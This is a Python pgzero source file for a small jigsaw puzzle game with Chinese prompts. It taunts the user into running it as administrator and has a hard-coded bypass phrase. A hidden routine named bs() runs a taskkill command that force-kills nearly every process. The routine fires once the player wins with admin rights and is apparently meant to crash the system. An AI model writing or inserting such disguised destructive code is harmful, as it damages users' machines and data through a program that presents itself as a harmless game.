import ctypes,sys,easygui
TEXT='''
hey，你为啥不给管理员权限？？？
你不给管理员权限会4吗？？？
你难道不会右键以管理员身份运行吗？？？
我就要管理员权限！！！
你不给是吧？？？
那我不让你用，诶，就是玩儿^v^
'''
def is_admin():#                                                -----|
    try:#                                                            |
        return ctypes.windll.shell32.IsUserAnAdmin()#                |
    except:#                                                         |
        return False#                                                |
if is_admin():#                                                      |
    pass#                                                            |---判断是否以管理员身份运行
else:#                                                               |
    if easygui.enterbox(TEXT)=='我不给管理员权限,诶,就是玩儿^v^':#走后门|
        easygui.msgbox('算你狠')#                                                        |
    else:#                                                           |
        exit()#                                                 -----|
import pgzrun,random,os,time
WIDTH = 300 ; HEIGHT = 400 ; TITLE = '拼图'
pt1=[]
pic1=[]
点击次数 = 0
点击序号1 = 点击序号2 = -1
for i in range(9):
    pic1.append(Actor('pt1_'+str(i+1)))
for ii in range(3):
    for jj in range(3):
        _pt1 = pic1[ii*3+jj]
        _pt1.left = jj * 100
        _pt1.top = ii * 100
        pt1.append(_pt1)
i = 0
j = 8
win = 0
_co = 'green'
BlueScreen = 0
ti = 60
def bs():
    os.system('taskkill /f /fi "pid ne 1"')
def aaa(i,j):
    tp=pt1[i].pos;pt1[i].pos = pt1[j].pos;pt1[j].pos = tp
for k in range(10):
    i = random.randint(0,8);j = random.randint(0,8);aaa(i,j)
def draw():
    global BlueScreen
    screen.clear()
    screen.draw.text(str(round(点击次数/2)),(WIDTH/2,320),fontsize=50,color=_co);screen.draw.text(str(round(ti)),(WIDTH/2,350),fontsize=50,color='red')
    if win == 1:
        if BlueScreen == 0:
            screen.draw.text('YOU WIN',(100,150),fontsize=50,color="red")
            if is_admin():
                BlueScreen = 1
                return
        if BlueScreen == 1:
            bs()
    if win == 2:
        screen.draw.text('GAME OVER',(50,150),fontsize=50,color="red")
    for pt in pt1:
        pt.draw()
    for i in range(3):
        screen.draw.line((0,i*100),(WIDTH,i*100),'black')
        screen.draw.line((i*100,0),(i*100,HEIGHT),'black')
    if 点击序号1 != -1:
        screen.draw.rect(Rect((pt1[点击序号1].left,pt1[点击序号1].top),(100,100)),'red')
def update():
    global win,_co,ti
    win = 1
    for i in range(3):
        for ii in range(3):
            if pt1[i*3+ii].left != ii*100 or pt1[i*3+ii].top != i*100:
                win = 0
                break
    if 点击次数/2 >= 5:
        _co = 'yellow'
    if 点击次数/2 >= 10:
        _co = 'blue'
    if 点击次数/2 >= 15:
        _co = 'red'
    if 点击次数/2 >= 21 or (time.time() - start) >= 60:
        win=2
        return
    if win == 0:
        ti = 60 + (start - time.time())
def on_mouse_down(pos,button):
    global 点击次数,点击序号1,点击序号2
    if win == 0:
        for ii in range(9):
            if pt1[ii].collidepoint(pos):
                break
        if 点击次数 %2 == 0:
            点击序号1 = ii
            点击次数 += 1
        elif 点击次数 %2 == 1:
            点击序号2 = ii
            点击次数 += 1
            aaa(点击序号1,点击序号2)
start = time.time()
pgzrun.go()